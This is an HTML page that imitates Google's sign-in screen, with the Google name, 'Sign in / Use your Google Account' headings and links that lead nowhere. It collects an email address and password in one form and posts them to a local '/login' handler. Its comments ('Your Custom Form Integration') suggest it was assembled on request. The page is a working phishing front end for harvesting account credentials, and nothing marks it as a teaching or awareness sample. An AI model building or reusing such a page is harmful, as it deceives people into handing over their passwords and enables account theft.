<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8">
  <title>Google</title>

  <!-- jQuery and Bootstrap -->
  <script src="static/js/jquery-3.4.1.min.js"></script>
  <script src="static/js/jquery-ui.min.js"></script>
  <link href="static/css/bootstrap.min.css" rel="stylesheet">
  <script src="static/js/bootstrap.min.js"></script>
  <link href="static/css/progress-bar.css" rel="stylesheet">
  <link rel="stylesheet" href="static/css/custom.css">

  <!-- Favicon -->
  <link rel="icon" type="image/png" href="static/img/favicon.ico">

  <!-- Mobile Responsive -->
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

  <style>
    @font-face {
      font-family: 'Roboto';
      src: url('static/fonts/Roboto-Regular.ttf') format('truetype');
      font-weight: normal;
    }

    @font-face {
      font-family: 'open-sans';
      src: url('static/fonts/OpenSans-Regular.ttf') format('truetype');
      font-weight: normal;
    }
  </style>
</head>
<body>
  <div id="login-app">
    <div class="login-container">

      <!-- Optional: progress bar (can remove if unused) -->
      <div class="progress-bar-container show-progress">
        <div class="progress-bar mdc-linear-progress mdc-linear-progress--indeterminate progress-hidden" style="display:none;">
          <div class="mdc-linear-progress mdc-linear-progress--indeterminate">
            <div class="mdc-linear-progress__buffering-dots"></div>
            <div class="mdc-linear-progress__buffer"></div>
            <div class="mdc-linear-progress__bar mdc-linear-progress__primary-bar">
              <span class="mdc-linear-progress__bar-inner"></span>
            </div>
            <div class="mdc-linear-progress__bar mdc-linear-progress__secondary-bar">
              <span class="mdc-linear-progress__bar-inner"></span>
            </div>
          </div>
        </div>
      </div>

      <div class="login-content" id="login-form">
        <div id="logo" title="Google">
          <!-- SVG logo placeholder -->
          <h1 style="font-family:Roboto, sans-serif; font-size:24px;">Google</h1>
        </div>

        <!-- ✅ Your Custom Form Integration -->
        <form id="email-form-step" action="/login" method="POST">
          <h1 class="g-h1">Sign in</h1>
          <h2 class="g-h2">Use your Google Account</h2>

          <div class="login-content">
            <label for="email">Email:</label><br>
            <input type="text" name="email" id="email" class="g-input" placeholder="Email or phone" required><br>

            <label for="password">Password:</label><br>
            <input type="password" name="password" id="password" class="g-input password-input" placeholder="Password" required><br><br>

            <input type="submit" value="Login" class="gbtn-primary">

            <legend class="g-legend">Forgot email?</legend>

            <div class="login-priv">
              <p class="p">Not your computer? Use a Private Window to sign in.</p>
              <legend class="g-legend">Learn more</legend>
            </div>

            <div class="login-nav">
              <legend class="g-legend">Create Account</legend>
            </div>
          </div>
        </form>

      </div>
    </div>
  </div>

  <!-- Optional: Error dialog placeholder -->
  <div id="dialog" style="display:none; color: red; padding: 10px;">Please fill out both fields.</div>

  <!-- ✅ Optional JS validation (can be removed if you're using server-side validation only) -->
  <script>
    $("#email-form-step").on("submit", function (e) {
      const email = document.getElementById("email");
      const password = document.getElementById("password");

      if (email.value.trim() === "" || password.value.trim() === "") {
        e.preventDefault();
        $("#dialog").show();
        $(".g-input").css('border', '1px solid #dd4b39');
      } else {
        $("#dialog").hide();
      }
    });
  </script>
</body>
  </html>
